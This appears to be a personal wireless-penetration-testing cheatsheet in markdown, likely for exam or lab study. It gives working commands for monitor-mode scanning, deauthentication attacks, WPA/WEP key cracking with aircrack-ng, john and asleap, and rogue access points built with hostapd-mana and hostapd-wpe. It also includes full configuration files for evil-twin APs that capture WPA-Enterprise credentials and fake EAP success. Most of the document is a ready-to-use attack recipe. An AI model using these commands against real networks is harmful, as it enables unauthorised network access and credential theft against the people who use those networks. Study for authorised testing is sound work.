
| [[Cheatsheet#Prep / Config\|Prep / Config]] | [[Cheatsheet#Rogue AP Attack\|Rogue AP Attack]]              | [[Cheatsheet#Connect to AP\|Connect to AP]] |
| ------------------------------------------- | ------------------------------------------------------------ | ------------------------------------------- |
| [[Cheatsheet#WEP Cracking\|WEP Cracking]]   | [[Cheatsheet#WPA-Enterprise (MGT)\|WPA-Enterprise Cracking]] | [[Cheatsheet#Example Files\|Example Files]] |

## Prep / Config
```shell
# SSH into VM
kali@kali:~$ ssh <user>@<ip> -p<port>

# Brief scan of wireless networks detected
kali@kali:~$ sudo iw dev wlan0 scan | grep SSID

# Setup monitor mode
kali@kali:~$ sudo airmon-ng start wlan0

# Scan on monitor mode
kali@kali:~$ sudo airodump-ng wlan0mon
kali@kali:~$ sudo airodump-ng --band abg wlan0mon
kali@kali:~$ sudo airodump-ng -w capture wlan0mon

# Change channel for wireless network card
kali@kali:~$ sudo iwconfig wlan0mon channel 3

# Use john with aircrack-ng
kali@kali:~$ sudo nano /etc/john/john.conf
kali@kali:~$ john --wordlist=/usr/share/john/password.lst --rules --stdout | aircrack-ng -e <ESSID> -w - capture-01.cap
```
## Rogue AP Attack
```shell
# Run Rogue AP
kali@kali:~$ hostapd-mana a.conf
# Example config files below
```
### Connect to AP
```shell
# Run WPA_Supplicant
kali@kali:~$ sudo wpa_supplicant -i wlan0mon -c wifi-client.conf
kali@kali:~$ sudo dhclient wlan0mon -v
kali@kali:~$ curl <IP_ADDR>/proof.txt
```
## WEP Cracking
```shell
# Setup monitor mode and identify target AP
kali@kali:~$ sudo airmon-ng check kill
kali@kali:~$ sudo airmon-ng start wlan0
kali@kali:~$ sudo airodump-ng wlan0mon
# Identify ap then narrow down to channel num

# Capture target AP for handshake
kali@kali:~$ sudo airodump-ng -c <channel-num> --wps -w capture --eesid <ESSID> --bssid <BSSID> wlan0mon

# Deauth attack to force handshake capture (new terminal/screen)
kali@kali:~$ sudo aireplay-ng -0 1 -a <BSSID> -c <CLIENT-MAC> wlan0mon

# Crack handshake found
kali@kali:~$ aircrack-ng -w /usr/share/wordlists/rockyou.txt -e <ESSID> -b <BSSID> capture-01.cap

# Decrypt traffic if needed
kali@kali:~$ airdecap-ng -b <BSSID> -e <ESSID> -p <key> capture-01.cap
```
## WPA-Enterprise (AUTH MGT)
```shell
### First, update hostapd-wpe.conf with correct INTERFACE, CHANNEL, SSID
kali@kali:~$ nano /etc/hostapd-wpe/hostapd-wpe.conf

# Run HostAPD-WPE
kali@kali:~$ sudo hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf

# Run ASLEAP command from HostAPD output e.g.
kali@kali:~$ asleap -C ce:b6:98:85:c6:56:59:0c -R 72:79:f6:5a:a4:98:70:f4:58:22:c8:9d:cb:dd:73:c1:b8:9d:37:78:44:ca:ea:d4 -W /usr/share/wordlists/rockyou.txt

### If fail, revert to FreeRADIUS server
kali@kali:~$ sudo apt install freeradius
kali@kali:~$ sudo nano /etc/freeradius/3.0/certs/na.cnf # change to same as target CA certificate
kali@kali:~$ sudo nano server.cnf # change to same as target server

# Generate Cert
kali@kali:~$ cd /etc/freeradius/3.0/certs
kali@kali:~$ rm dh
kali@kali:~$ make

# Run HostAPD-Mana
kali@kali:~$ sudo hostapd-mana /etc/hostapd-mana/mana.conf
```
## Example Files
### Hostapd-mana Conf Files
opn.conf
```json
network={
	ssid="wifi-free"
    key_mgmt=NONE
    scan_ssid=1
}
```
psk.conf
```json
network={
  ssid="home_network"
  scan_ssid=1
  psk="correct battery horse staple"
  key_mgmt=WPA-PSK
}
```
mgt.conf
```json
network={
    ssid="wifi-mobile"
    scan_ssid=1
    key_mgmt=WPA-EAP
    identity="user"
    password="password"
    eap=PEAP
    phase1="peaplabel=0"
    phase2="auth=MSCHAPV2"
}
```
Mostar-mana.conf (WPA-PSK)
```shell
interface=wlan0
ssid=Mostar
channel=1
hw_mode=g
ieee80211n=1
wpa=3
wpa_key_mgmt=WPA-PSK
wpa_passphrase=ANYPASSWORD
wpa_pairwise=TKIP
rsn_pairwise=TKIP CCMP
mana_wpaout=/home/kali/mostar.hccapx
```
mana.conf (WPA-E)
```shell
# SSID of the AP
ssid=Playtronics

# Network interface to use and driver type
# We must ensure the interface lists 'AP' in 'Supported interface modes' when running 'iw phy PHYX info'
interface=wlan0
driver=nl80211

# Channel and mode
# Make sure the channel is allowed with 'iw phy PHYX info' ('Frequencies' field - there can be more than one)
channel=1
# Refer to https://w1.fi/cgit/hostap/plain/hostapd/hostapd.conf to set up 802.11n/ac/ax
hw_mode=g

# Setting up hostapd as an EAP server
ieee8021x=1
eap_server=1

# Key workaround for Win XP
eapol_key_index_workaround=0

# EAP user file we created earlier
eap_user_file=/etc/hostapd-mana/mana.eap_user

# Certificate paths created earlier
ca_cert=/etc/freeradius/3.0/certs/ca.pem
server_cert=/etc/freeradius/3.0/certs/server.pem
private_key=/etc/freeradius/3.0/certs/server.key
# The password is actually 'whatever'
private_key_passwd=whatever
dh_file=/etc/freeradius/3.0/certs/dh

# Open authentication
auth_algs=1
# WPA/WPA2
wpa=3
# WPA Enterprise
wpa_key_mgmt=WPA-EAP
# Allow CCMP and TKIP
# Note: iOS warns when network has TKIP (or WEP)
wpa_pairwise=CCMP TKIP

# Enable Mana WPE
mana_wpe=1

# Store credentials in that file
mana_credout=/tmp/hostapd.credout

# Send EAP success, so the client thinks it's connected
mana_eapsuccess=1

# EAP TLS MitM
mana_eaptls=1
```
mana.eap_user
```shell
*     PEAP,TTLS,TLS,FAST
"t"   TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP,MSCHAPV2,MD5,GTC,TTLS,TTLS-MSCHAPV2    "pass"   [2]
```